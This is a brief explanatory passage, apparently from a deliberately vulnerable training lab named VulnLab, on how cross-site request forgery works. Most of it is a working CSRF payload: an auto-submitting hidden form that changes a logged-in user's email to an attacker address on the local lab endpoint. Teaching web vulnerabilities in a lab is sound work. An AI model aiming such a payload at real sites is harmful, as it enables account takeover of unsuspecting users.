How CSRF Works

An attacker creates a malicious page that auto-submits a form to VulnLab:

<form method="POST"
  action="http://localhost:5000/vulns/csrf">
  <input type="hidden"
    name="action" value="change_email">
  <input type="hidden"
    name="email" value="evil@attacker.com">
</form>
<script>document.forms[0].submit()</script>
